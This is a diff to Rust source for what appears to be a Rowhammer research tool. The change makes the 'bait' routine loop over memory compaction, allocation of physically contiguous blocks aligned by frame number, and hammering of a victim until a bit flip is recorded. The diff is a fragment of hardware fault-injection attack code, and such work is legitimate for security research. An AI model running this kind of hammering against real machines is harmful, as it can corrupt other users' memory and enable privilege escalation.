@@ -359,10 +359,17 @@ unsafe fn mode_bait(args: CliArgs) -> anyhow::Result<()> {
 
     pg.set_length(num_sets as u64);
 
-    loop {
-compact_mem()?;
+    let mut flip = false;
+    while !flip {
+        compact_mem()?;
         pg.set_position(0);
         let memory = alloc_strategy.alloc_consec_blocks(num_sets * block_size, || pg.inc(1))?;
+        let memory = memory.pfn_align(
+            &mem_config,
+            config.threshold,
+            &*construct_memory_tuple_timer()?,
+        )?;
+        memory.log_pfns()?;
         pg.finish_and_clear();
         let hammering_addrs = mapping.get_hammering_addresses_relocate(
             &pattern.access_ids,
@@ -383,6 +390,7 @@ compact_mem()?;
 
         info!("Hammering pattern. This might take a while...");
         let res = hammerer.hammer(&mut victim, 3);
+        flip = res.is_ok();
         match res {
             Ok(res) => {
                 info!("{:?}", res);
@@ -390,23 +398,11 @@ compact_mem()?;
             }
             Err(e) => {
                 warn!("Hammering not successful: {:?}", e);
-                memory.dealloc();
-                continue;
             }
         }
-
-        // signal child process
-        //signal("INT", child.id())?;
-        //let _output = child.wait_with_output().expect("child wait");
-        //thread::sleep(std::time::Duration::from_secs(2));
-
-        // cleanup
-        //libc::munmap(v as *mut c_void, 2 * MB);
-        // TODO munmap all allocation
-
         memory.dealloc();
-        return Ok(());
     }
+    Ok(())
 }
 
 unsafe fn mode_prey() -> anyhow::Result<()> {
